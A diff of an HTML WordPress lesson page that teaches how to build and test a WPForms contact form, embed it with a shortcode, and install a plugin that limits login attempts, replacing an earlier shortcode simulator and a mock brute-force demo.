+      </div>
+    </section>
+
+
+    <!-- ══════ PHASE 2b — Add Dropdown Field ══════ -->
+    <section class="phase-section" id="phase-2b">
+      <header class="phase-header phase-teal">
+        <span class="phase-badge">Phase 2  ·  Continued</span>
+        <h2>Build the Contact Form — Part 2: Add Custom Dropdown Field</h2>
+        <span class="phase-time">Part 2 of 2</span>
+      </header>
+      <div class="phase-body">
+
+        <div class="concept-box concept-teal">
+          <div class="concept-title">🔽 Why add a Dropdown (Subject) field?</div>
+          <p>
+            A dropdown forces users to choose from a pre-set list, which means:
+            <strong>no typos, consistent data, easier to filter.</strong>
+            In HTML Week 2, you wrote <code>&lt;select&gt;&lt;option&gt;</code> manually.
+            In WPForms, you drag it in and type the options — no code.
+          </p>
+        </div>
+
+        <ol class="step-list" data-phase="phase2b">
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Re-open the form builder (if you closed it)</div>
+              <div class="step-desc">If you left the builder, go to:</div>
+              <div class="nav-path">
+                <span class="np-item">WPForms</span><span class="np-arrow">→</span>
+                <span class="np-item">All Forms</span><span class="np-arrow">→</span>
+                <span class="np-item np-active">Edit (Main Contact Form)</span>
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Find the "Dropdown" field in the left panel</div>
+              <div class="step-desc">
+                Look at the <strong>Add Fields</strong> panel on the left side of the builder.
+                It shows categories of field types: Standard Fields, Fancy Fields, Payment Fields, etc.
+              </div>
+              <ol class="sub-steps">
+                <li>Under <strong>Standard Fields</strong>, find the <strong>Dropdown</strong> field</li>
+                <li>It has a downward arrow icon (▾)</li>
+              </ol>
+              <div class="note note-blue">
+                💡 All the field types listed on the left are different HTML input types you already know.
+                WPForms just provides a visual interface to add them without writing code.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Drag the Dropdown field into the form</div>
+              <div class="step-desc">Position the dropdown BELOW the Email field:</div>
+              <ol class="sub-steps">
+                <li>Click and <strong>hold</strong> the Dropdown field in the left panel</li>
+                <li><strong>Drag</strong> it to the right side — over the space between the Email and Comment/Message fields</li>
+                <li>A blue line appears showing where it will be inserted</li>
+                <li><strong>Release</strong> the mouse to drop it there</li>
+              </ol>
+              <div class="step-desc" style="margin-top:.5rem;">
+                The Dropdown field is now added to your form. A settings panel automatically opens on the left.
+              </div>
+              <div class="note note-blue">
+                💡 If drag-and-drop doesn't work, try just clicking the Dropdown field in the left panel — WPForms will add it to the bottom of the form automatically.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Change the Label to "Subject"</div>
+              <div class="step-desc">
+                Click on the new Dropdown field in the form preview to open its settings in the left panel.
+                Find the <strong>Label</strong> field:
+              </div>
+              <ol class="sub-steps">
+                <li>Find the <strong>Label</strong> text input in the settings panel</li>
+                <li>Delete the current text (it says "Dropdown")</li>
+                <li>Type: <code>Subject</code></li>
+                <li>Watch the field label update in the preview automatically</li>
+              </ol>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Set the dropdown Choices to 3 options</div>
+              <div class="step-desc">
+                In the same settings panel, scroll down to find the <strong>Choices</strong> section.
+                This is where you define the options in the dropdown:
+              </div>
+              <ol class="sub-steps">
+                <li>You will see existing placeholder choices like "First Choice", "Second Choice"</li>
+                <li>Click on <strong>First Choice</strong> → delete the text → type: <code>General Inquiry</code></li>
+                <li>Click on <strong>Second Choice</strong> → delete → type: <code>Support</code></li>
+                <li>Click on <strong>Third Choice</strong> → delete → type: <code>Sales</code></li>
+                <li>If there are extra choices, click the red minus (−) button next to them to delete</li>
+              </ol>
+
+              <div class="choices-preview">
+                <div class="cp-label">Your dropdown will look like this:</div>
+                <div class="cp-select-mock">
+                  <div class="cps-item cps-blank">— Select a subject —</div>
+                  <div class="cps-item">General Inquiry</div>
+                  <div class="cps-item">Support</div>
+                  <div class="cps-item">Sales</div>
+                </div>
+              </div>
+
+              <div class="note note-blue">
+                💡 In HTML this would be: <code>&lt;select&gt;&lt;option&gt;General Inquiry&lt;/option&gt;...&lt;/select&gt;</code>
+                WPForms generates this for you.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Toggle the "Required" switch ON</div>
+              <div class="step-desc">
+                Scroll down in the Dropdown field settings panel to find the <strong>Required</strong> toggle switch.
+              </div>
+              <ol class="sub-steps">
+                <li>Find the toggle labelled <strong>Required</strong></li>
+                <li>Click it so it turns <strong>blue/green (ON)</strong></li>
+                <li>A red asterisk (*) appears next to the Subject label in the preview</li>
+              </ol>
+              <div class="before-after" style="margin-top:.6rem;">
+                <div class="ba-card ba-bad">
+                  <div class="ba-label">Required OFF</div>
+                  <div class="ba-value">Subject (no asterisk)</div>
+                  <div class="ba-explain">User can skip this field and still submit</div>
+                </div>
+                <div class="ba-arrow">→</div>
+                <div class="ba-card ba-good">
+                  <div class="ba-label">Required ON ✅</div>
+                  <div class="ba-value">Subject *</div>
+                  <div class="ba-explain">Form WILL NOT submit without this field</div>
+                </div>
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ SAVE</span> Click Save → then click X to exit the builder</div>
+              <ol class="sub-steps">
+                <li>Click the orange <strong>Save</strong> button (top-right)</li>
+                <li>Wait for the "Saved" confirmation</li>
+                <li>Click the <strong>X</strong> button or the back arrow to exit the builder</li>
+              </ol>
+              <div class="note note-green">
+                ✅ Your form now has 4 fields: Name · Email · Subject (dropdown, required) · Message.<br>
+                The form exists in the database but is not yet on any page.
+              </div>
+            </div>
+          </li>
+
+        </ol>
+      </div>
+    </section>
+
+
+    <!-- ══════ PHASE 3 — Shortcode & Embed ══════ -->
+    <section class="phase-section" id="phase-3">
+      <header class="phase-header phase-purple">
+        <span class="phase-badge">Phase 3  ·  30 min</span>
+        <h2>Shortcodes &amp; Embedding — Put the Form on the Contact Page</h2>
+        <span class="phase-time">Part 1 of 2</span>
+      </header>
+      <div class="phase-body">
+
+        <!-- Shortcode concept -->
+        <div class="shortcode-explainer">
+          <div class="se-title">🧩 What is a WordPress Shortcode?</div>
+          <div class="se-body">
+            <p>
+              A <strong>shortcode</strong> is a small text tag inside square brackets
+              that WordPress replaces with complex PHP output when loading a page.
+            </p>
+            <div class="se-flow">
+              <div class="sef-step">
+                <div class="sef-label">You type in the editor:</div>
+                <code class="sef-code">[wpforms id="1" title="false"]</code>
+              </div>
+              <div class="sef-arrow">→</div>
+              <div class="sef-step">
+                <div class="sef-label">WordPress calls WPForms PHP function:</div>
+                <code class="sef-code" style="color:#a8d8a8;">wpforms_get_form(1)</code>
+              </div>
+              <div class="sef-arrow">→</div>
+              <div class="sef-step">
+                <div class="sef-label">Visitor sees on the page:</div>
+                <div class="sef-result">A fully styled, working contact form with all your fields!</div>
+              </div>
+            </div>
+            <div class="note note-blue" style="margin-top:.7rem;">
+              💡 Shortcodes work on <strong>any page or post</strong>.
+              You could put the same contact form on 10 different pages using the same one line of text.
             </div>
           </div>
         </div>
 
+        <ol class="step-list" data-phase="phase3">
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Go to WPForms → All Forms to find your shortcode</div>
+              <div class="nav-path">
+                <span class="np-item">WPForms</span><span class="np-arrow">→</span>
+                <span class="np-item np-active">All Forms</span>
+              </div>
+              <div class="step-desc" style="margin-top:.5rem;">
+                You will see your <strong>Main Contact Form</strong> listed in a table.
+                The table has several columns including: Name · Entries · Created · Shortcode.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Copy the Shortcode</div>
+              <div class="step-desc">Find the <strong>Shortcode</strong> column next to "Main Contact Form".</div>
+              <ol class="sub-steps">
+                <li>You will see a code like: <code>[wpforms id="1" title="false"]</code></li>
+                <li>Click on the shortcode text — it may auto-copy, or select all and press <kbd>Ctrl</kbd>+<kbd>C</kbd></li>
+                <li>The shortcode is now in your clipboard</li>
+              </ol>
+              <div class="note note-blue">
+                💡 The <code>id="1"</code> is the unique ID of your form in the database. Every form gets a different ID number.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Open the Contact page for editing</div>
+              <div class="nav-path">
+                <span class="np-item">Pages</span><span class="np-arrow">→</span>
+                <span class="np-item">All Pages</span><span class="np-arrow">→</span>
+                <span class="np-item np-active">Edit (Contact)</span>
+              </div>
+              <div class="step-desc" style="margin-top:.5rem;">
+                The Gutenberg block editor opens for your Contact page.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Remove any existing placeholder text on the Contact page</div>
+              <div class="step-desc">
+                If you added placeholder text in Week 9 (like "Use the form below to get in touch"),
+                select it and delete it — or keep it above where you will add the shortcode block.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Add a Shortcode block</div>
+              <div class="step-desc">In the Gutenberg editor, you need to add a <strong>Shortcode</strong> block (not a Paragraph block):</div>
+              <ol class="sub-steps">
+                <li>Click an empty area in the editor to place the cursor</li>
+                <li>Click the <strong>+</strong> (Add Block) button or type <kbd>/</kbd></li>
+                <li>In the search box, type: <code>shortcode</code></li>
+                <li>Click the <strong>Shortcode</strong> block — it has a curly bracket icon <code>{ }</code></li>
+                <li>A text input box appears labelled <em>"Enter shortcode here…"</em></li>
+              </ol>
+              <div class="note note-blue">
+                💡 The Shortcode block is different from a Paragraph block.
+                A Paragraph block displays text. A Shortcode block executes PHP code and renders its output.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Paste your shortcode into the block</div>
+              <ol class="sub-steps">
+                <li>Click inside the Shortcode block text area</li>
+                <li>Press <kbd>Ctrl</kbd>+<kbd>V</kbd> (Windows) or <kbd>Cmd</kbd>+<kbd>V</kbd> (Mac) to paste</li>
+                <li>You should see: <code>[wpforms id="1" title="false"]</code></li>
+              </ol>
+              <div class="note note-blue">
+                💡 In the Gutenberg editor you may not see a live preview of the form — that is normal.
+                The form only renders when a visitor actually views the page.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Click Update to save the Contact page</div>
+              <ol class="sub-steps">
+                <li>Click the blue <strong>Update</strong> button in the top-right corner</li>
+                <li>Wait for "Updated" confirmation</li>
+                <li>Click <strong>View Page</strong> to see the live result</li>
+              </ol>
+              <div class="note note-green">
+                ✅ Your Contact page should now display a fully styled, working contact form!
+                You should see the Name, Email, Subject dropdown, and Message fields.
+              </div>
+            </div>
+          </li>
+
+        </ol>
       </div>
     </section>
 
 
-    <!-- ══════════════════════════════════════════════════════════
-      PHASE 3 · SHORTCODE SIMULATOR
-      Demonstrates: What shortcodes are and how they work
-    ══════════════════════════════════════════════════════════════ -->
-    <section class="demo-section" id="phase-3">
-      <header class="section-header header-purple">
-        <span class="phase-badge">Phase 3  ·  30 min</span>
-        <h2>Shortcodes — The WordPress Injection System</h2>
+    <!-- ══════ PHASE 3t — Test the Form ══════ -->
+    <section class="phase-section" id="phase-3t">
+      <header class="phase-header phase-purple">
+        <span class="phase-badge">Phase 3  ·  Continued</span>
+        <h2>Test the Contact Form — Validation Scenarios</h2>
+        <span class="phase-time">Part 2 of 2</span>
       </header>
-
-      <div class="section-body">
-
-        <!-- ── 3A: What shortcodes are ── -->
-        <article class="demo-card">
-          <h3 class="demo-card-title">Demo 3A — Shortcode Simulator</h3>
-          <p class="demo-desc">
-            A <strong>shortcode</strong> is a small text tag in square brackets
-            that WordPress replaces with complex PHP output.
-            Type a shortcode in the editor below and click Render to see what happens:
-          </p>
-
-          <!-- Simulated Gutenberg editor -->
-          <div class="gutenberg-sim">
-
-            <div class="gs-toolbar">
-              <span class="gs-tool">B</span>
-              <span class="gs-tool"><em>I</em></span>
-              <span class="gs-tool">🔗</span>
-              <span class="gs-tool active">{ }</span>
-              <span class="gs-label">← Shortcode block selected</span>
-            </div>
-
-            <div class="gs-editor">
-              <div class="gs-paragraph">Welcome to our Contact page. Please use the form below to get in touch.</div>
-              <div class="gs-shortcode-block">
-                <div class="gsb-label">Shortcode Block</div>
-                <input
-                  type="text"
-                  class="gsb-input"
-                  id="shortcode-input"
-                  value='[wpforms id="1" title="false"]'
-                  aria-label="Shortcode input"
-                />
-                <button class="gsb-render-btn" onclick="renderShortcode()">▶  Render Shortcode</button>
-              </div>
-              <div class="gs-paragraph">Thank you for your message!</div>
-            </div>
-
-          </div>
-
-          <!-- What WordPress renders -->
-          <div class="shortcode-output" id="shortcode-output" aria-live="polite">
-            <div class="so-label">WordPress renders this on the page →</div>
-            <div class="so-content" id="so-content">
-              <em style="color:var(--text-light);">Click "Render Shortcode" to see the output...</em>
-            </div>
-          </div>
-
-          <p class="demo-note note-blue">
-            💡 <strong>How shortcodes work:</strong> WordPress scans all page content for <code>[text in brackets]</code>.
-            When it finds one, it calls the PHP function that was registered for that shortcode.
-            The PHP function generates and returns the full HTML output, which replaces the shortcode text.
-          </p>
-        </article>
-
-
-        <!-- ── 3B: Try different shortcodes ── -->
-        <article class="demo-card">
-          <h3 class="demo-card-title">Demo 3B — Shortcode Examples</h3>
-          <p class="demo-desc">
-            Shortcodes are used by many WordPress plugins and even WordPress itself.
-            Click any example to load it in the simulator above:
-          </p>
-
-          <div class="shortcode-examples">
-
-            <div class="se-item" onclick="loadShortcode('[wpforms id=\\'1\\' title=\\'false\\']')">
-              <div class="se-code">[wpforms id="1" title="false"]</div>
-              <div class="se-name">WPForms — embed contact form #1</div>
-              <div class="se-plugin">Plugin: WPForms</div>
-            </div>
-
-            <div class="se-item" onclick="loadShortcode('[contact-form-7 id=\\'cf7-1\\' title=\\'Contact form 1\\']')">
-              <div class="se-code">[contact-form-7 id="cf7-1" title="Contact form 1"]</div>
-              <div class="se-name">Contact Form 7 — alternative form plugin</div>
-              <div class="se-plugin">Plugin: Contact Form 7</div>
-            </div>
-
-            <div class="se-item" onclick="loadShortcode('[gallery ids=\\'1,2,3\\' columns=\\'3\\']')">
-              <div class="se-code">[gallery ids="1,2,3" columns="3"]</div>
-              <div class="se-name">WordPress built-in image gallery</div>
-              <div class="se-plugin">Built into WordPress core</div>
-            </div>
-
-            <div class="se-item" onclick="loadShortcode('[youtube url=\\'https://youtube.com/watch?v=abc\\']')">
-              <div class="se-code">[youtube url="https://youtube.com/watch?v=abc"]</div>
-              <div class="se-name">Embed a YouTube video</div>
-              <div class="se-plugin">Plugin: WP YouTube Embed</div>
-            </div>
-
-          </div>
-
-          <!-- Shortcode anatomy breakdown -->
-          <div class="shortcode-anatomy">
-            <div class="sa-title">Anatomy of a Shortcode</div>
-            <div class="sa-diagram">
-              <code class="sa-code">[wpforms  id="1"  title="false"]</code>
-              <div class="sa-parts">
-                <div class="sa-part" style="left:1px; width:80px;">
-                  <div class="sa-line"></div>
-                  <div class="sa-label">Shortcode name<br>(the plugin)</div>
-                </div>
-                <div class="sa-part" style="left:108px; width:55px;">
-                  <div class="sa-line"></div>
-                  <div class="sa-label">Attribute<br>(which form)</div>
-                </div>
-                <div class="sa-part" style="left:180px; width:80px;">
-                  <div class="sa-line"></div>
-                  <div class="sa-label">Attribute<br>(show title?)</div>
-                </div>
-              </div>
-            </div>
-          </div>
-
-        </article>
-
-      </div>
-    </section>
-
-
-    <!-- ══════════════════════════════════════════════════════════
-      PHASE 4 · SECURITY — BRUTE-FORCE SIMULATOR
-      Demonstrates: How brute-force attacks work and how LLA stops them
-    ══════════════════════════════════════════════════════════════ -->
-    <section class="demo-section" id="phase-4">
-      <header class="section-header header-red">
-        <span class="phase-badge">Phase 4  ·  15 min</span>
-        <h2>Security — Brute-Force Attack Simulator</h2>
-      </header>
-
-      <div class="section-body">
+      <div class="phase-body">
 
         <p class="phase-intro">
-          This simulator shows what happens when a bot repeatedly tries to log in to WordPress.
-          See the difference between an <strong>unprotected</strong> site
-          and one with <strong>Limit Login Attempts Reloaded</strong> active.
+          A good form must <strong>reject</strong> invalid or incomplete submissions.
+          Test every scenario below on the live Contact page before moving on.
         </p>
 
-        <!-- ── 4A: Brute force simulator ── -->
-        <article class="demo-card">
-          <h3 class="demo-card-title">Demo 4A — WordPress Login Attack Simulator</h3>
+        <ol class="step-list" data-phase="phase3t">
 
-          <!-- Controls -->
-          <div class="brute-controls">
-            <div class="bc-setting">
-              <label>Protection status:</label>
-              <div class="toggle-group">
-                <button class="tg-btn active" id="btn-unprotected" onclick="setProtection(false)">
-                  ❌ Unprotected
-                </button>
-                <button class="tg-btn" id="btn-protected" onclick="setProtection(true)">
-                  ✅ Limit Login Attempts Active
-                </button>
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">TEST 1</span> Submit with ALL fields empty</div>
+              <div class="step-desc">On the live Contact page, click <strong>Submit</strong> without filling in anything.</div>
+              <div class="test-result test-fail">
+                <div class="tr-label">Expected result:</div>
+                <div class="tr-value">Red error messages appear under every required field. The form does NOT submit.</div>
+              </div>
+              <div class="note note-blue">
+                💡 This is the same "required field" behaviour you implemented with JavaScript in Week 6.
+                WPForms does this automatically for all Required fields.
               </div>
             </div>
-            <div class="bc-setting">
-              <label>Attack speed:</label>
-              <select class="bc-select" id="speed-select">
-                <option value="600">Slow (1 try/0.6s) — educational view</option>
-                <option value="200" selected>Fast (1 try/0.2s) — realistic</option>
-                <option value="50">Very Fast (1 try/0.05s) — real bots</option>
-              </select>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">TEST 2</span> Enter a broken email address</div>
+              <div class="step-desc">Fill in the Name field, then type an invalid email like <code>hello</code> or <code>hello@</code> (without a full domain). Leave Subject and Message empty.</div>
+              <div class="test-result test-fail">
+                <div class="tr-label">Expected result on the Email field:</div>
+                <div class="tr-value">"Please enter a valid email address."</div>
+              </div>
+              <div class="note note-blue">
+                💡 WPForms validates the email format using the same regex you used in Week 6:
+                must have text + @ + domain + .extension.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">TEST 3</span> Leave the Subject dropdown unselected</div>
+              <div class="step-desc">Fill in Name and Email correctly. Leave the Subject dropdown on the blank "— Select —" option. Fill in a message. Click Submit.</div>
+              <div class="test-result test-fail">
+                <div class="tr-label">Expected result on the Subject field:</div>
+                <div class="tr-value">A required field error appears — because you toggled Required ON in Phase 2.</div>
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">TEST 4</span> Fill in everything correctly → Submit</div>
+              <div class="step-desc">Fill in all fields with valid data:</div>
+              <div class="creds-grid" style="max-width:380px;">
+                <div class="cred-row"><span class="cred-label">Name</span><code>Your Name</code></div>
+                <div class="cred-row"><span class="cred-label">Email</span><code>test@example.com</code></div>
+                <div class="cred-row"><span class="cred-label">Subject</span><code>General Inquiry</code></div>
+                <div class="cred-row"><span class="cred-label">Message</span><code>This is a test message.</code></div>
+              </div>
+              <div class="step-desc" style="margin-top:.5rem;">Click <strong>Submit</strong>.</div>
+              <div class="test-result test-pass">
+                <div class="tr-label">Expected result:</div>
+                <div class="tr-value">A green success message appears: "Thanks for contacting us! We will be in touch with you shortly."</div>
+              </div>
+              <div class="note note-blue">
+                💡 On localhost: the email does NOT actually send to your inbox.
+                But in a real hosted WordPress site, WPForms would email the submission to your admin address.
+                The submission IS saved — go to WPForms → Entries to view it in the database.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">View the form submission in WPForms → Entries</div>
+              <div class="step-desc">After a successful submission, go check the database:</div>
+              <div class="nav-path">
+                <span class="np-item">WPForms</span><span class="np-arrow">→</span>
+                <span class="np-item np-active">Entries</span>
+              </div>
+              <div class="step-desc" style="margin-top:.4rem;">
+                You should see your test submission listed with all the field values.
+                This is where all real form submissions are stored in the database.
+              </div>
+              <div class="note note-green">✅ Phase 3 complete! You have a working contact form embedded on your Contact page using a shortcode.</div>
+            </div>
+          </li>
+
+        </ol>
+      </div>
+    </section>
+
+
+    <!-- ══════ PHASE 4 — Security Plugin ══════ -->
+    <section class="phase-section" id="phase-4">
+      <header class="phase-header phase-red">
+        <span class="phase-badge">Phase 4  ·  15 min</span>
+        <h2>Security — Install Limit Login Attempts Reloaded</h2>
+      </header>
+      <div class="phase-body">
+
+        <!-- Brute force concept -->
+        <div class="brute-force-explainer">
+          <div class="bfe-title">🔴 What is a Brute-Force Attack? (The #1 WordPress Threat)</div>
+          <div class="bfe-body">
+            <p>
+              WordPress powers <strong>43% of all websites</strong> on the internet.
+              This makes it the biggest target for automated hacker bots.
+            </p>
+            <p style="margin-top:.5rem;">
+              A <strong>brute-force bot</strong> finds your <code>/wp-admin</code> login page
+              and tries thousands of username + password combinations per minute:
+              <code>admin / 123456</code>, <code>admin / password</code>, <code>admin / admin123</code>...
+            </p>
+            <div class="bfe-flow">
+              <div class="bff-step bff-red">Bot finds<br>/wp-admin</div>
+              <span class="bff-arrow">→</span>
+              <div class="bff-step bff-orange">Tries admin<br>+ 123456</div>
+              <span class="bff-arrow">→</span>
+              <div class="bff-step bff-orange">Fails →<br>tries again</div>
+              <span class="bff-arrow">→</span>
+              <div class="bff-step bff-orange">Tries 1000s<br>of passwords</div>
+              <span class="bff-arrow">→</span>
+              <div class="bff-step bff-red">Eventually<br>logs in!</div>
+            </div>
+            <div class="bfe-fix">
+              <strong>✅ The Fix:</strong> Limit Login Attempts Reloaded automatically
+              <strong>locks out any IP after 4 failed attempts</strong>.
+              The bot gets blocked after 4 tries instead of 10,000.
             </div>
           </div>
+        </div>
 
-          <!-- Login form mock -->
-          <div class="wp-login-mock" id="wp-login-mock">
-            <div class="wlm-header">
-              <div class="wlm-logo">W</div>
-              <div class="wlm-title">Log In</div>
+        <ol class="step-list" data-phase="phase4">
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Go to Plugins → Add New Plugin</div>
+              <div class="nav-path">
+                <span class="np-item">Plugins</span><span class="np-arrow">→</span>
+                <span class="np-item np-active">Add New Plugin</span>
+              </div>
             </div>
-            <div class="wlm-field">
-              <label>Username</label>
-              <div class="wlm-input" id="attack-username">admin</div>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Search for "Limit Login Attempts Reloaded"</div>
+              <div class="step-desc">Type the exact name in the search bar: <code>Limit Login Attempts Reloaded</code></div>
+              <div class="step-desc" style="margin-top:.4rem;">
+                Look for the correct plugin — it should show:
+              </div>
+              <ul class="sub-steps">
+                <li>Name: <strong>Limit Login Attempts Reloaded</strong></li>
+                <li>3,000,000+ active installations</li>
+                <li>By: Limit Login Attempts Reloaded</li>
+              </ul>
+              <div class="note note-red">⚠️ There are several similar plugins. Make sure the name is exactly "Limit Login Attempts Reloaded".</div>
             </div>
-            <div class="wlm-field">
-              <label>Password</label>
-              <div class="wlm-input wlm-password" id="attack-password">••••••••</div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Install Now → Activate</div>
+              <ol class="sub-steps">
+                <li>Click <strong>Install Now</strong></li>
+                <li>Wait for the download to complete</li>
+                <li>Click <strong>Activate</strong></li>
+              </ol>
+              <div class="note note-green">✅ The plugin is now active! It is already working with the default settings — your login page is now protected.</div>
             </div>
-            <div class="wlm-btn" id="wlm-submit">Log In</div>
-            <div class="wlm-error hidden" id="wlm-error">
-              ❌ ERROR: The password you entered is incorrect.
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Go to Settings → Limit Login Attempts to review the configuration</div>
+              <div class="nav-path">
+                <span class="np-item">Settings</span><span class="np-arrow">→</span>
+                <span class="np-item np-active">Limit Login Attempts</span>
+              </div>
+              <div class="step-desc" style="margin-top:.5rem;">
+                The plugin settings page opens. Review the default configuration:
+              </div>
+              <div class="lla-config-display">
+                <div class="lcd-row">
+                  <span class="lcd-label">Allowed retries before lockout:</span>
+                  <span class="lcd-value">4 attempts</span>
+                </div>
+                <div class="lcd-row">
+                  <span class="lcd-label">Lockout duration:</span>
+                  <span class="lcd-value">20 minutes</span>
+                </div>
+                <div class="lcd-row">
+                  <span class="lcd-label">After 2 lockouts → extend to:</span>
+                  <span class="lcd-value">24 hours</span>
+                </div>
+              </div>
+              <div class="note note-blue">
+                💡 The defaults are already good. A human who forgets their password will just be locked out for 20 minutes — a minor inconvenience. A bot that tries 10,000 passwords is completely stopped.
+              </div>
             </div>
-            <div class="wlm-lockout hidden" id="wlm-lockout">
-              🔒 Too many failed login attempts.<br>
-              Your IP (192.168.1.100) has been locked out for 20 minutes.
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Scroll down to see the Statistics / Log section</div>
+              <div class="step-desc">
+                On the settings page, scroll down to find the <strong>Statistics</strong> or <strong>Log</strong> section.
+                This shows a log of all blocked login attempts — even on a brand new localhost site,
+                you may eventually see entries here as bots scan the internet.
+              </div>
+              <div class="note note-green">
+                ✅ Limit Login Attempts is now active and protecting your site.
+                This ONE plugin dramatically reduces the risk of unauthorised access.
+                Always install it on any live WordPress website.
+              </div>
+            </div>
+          </li>
+
+        </ol>
+      </div>
+    </section>
+
+
+    <!-- ══════ FINAL AUDIT ══════ -->
+    <section class="phase-section" id="audit">
+      <header class="phase-header phase-gold">
+        <span class="phase-badge">End of Session</span>
+        <h2>Final Checklist — Is Everything Working?</h2>
+      </header>
+      <div class="phase-body">
+
+        <p class="phase-intro">
+          Verify every item below before finishing. Fix anything that is missing.
+        </p>
+
+        <ul class="step-list" data-phase="audit">
+
+          <li class="audit-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">WPForms plugin is installed and active</div>
+              <div class="step-desc">Plugins → Installed Plugins — "WPForms" should appear with an Active status (blue text).</div>
+            </div>
+          </li>
+
+          <li class="audit-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">"Main Contact Form" exists with 4 fields</div>
+              <div class="step-desc">WPForms → All Forms — "Main Contact Form" should be listed with fields: Name · Email · Subject (dropdown) · Message.</div>
+            </div>
+          </li>
+
+          <li class="audit-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Subject dropdown has 3 choices and is Required</div>
+              <div class="step-desc">WPForms → Edit form → click the Subject field → Choices = "General Inquiry, Support, Sales" · Required toggle = ON.</div>
+            </div>
+          </li>
+
+          <li class="audit-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Contact page shows the working form</div>
+              <div class="step-desc">Visit http://localhost/mywebsite/contact/ — a styled contact form must be visible with all fields.</div>
+            </div>
+          </li>
+
+          <li class="audit-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Form validation rejects empty and invalid submissions</div>
+              <div class="step-desc">On the Contact page, click Submit with no fields filled in — red error messages must appear. Entering a broken email must show an email format error.</div>
+            </div>
+          </li>
+
+          <li class="audit-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Successful form submission shows a green success message</div>
+              <div class="step-desc">Fill in all fields correctly and submit — a green "Thanks for contacting us!" message must appear.</div>
+            </div>
+          </li>
+
+          <li class="audit-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Limit Login Attempts Reloaded is active</div>
+              <div class="step-desc">Plugins → Installed Plugins — "Limit Login Attempts Reloaded" is listed and active.</div>
+            </div>
+          </li>
+
+          <li class="audit-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">LLA default settings are configured</div>
+              <div class="step-desc">Settings → Limit Login Attempts — 4 retries before lockout, 20 minute lockout period is set.</div>
+            </div>
+          </li>
+
+        </ul>
+
+        <div id="session-complete" class="session-complete" style="display:none;">
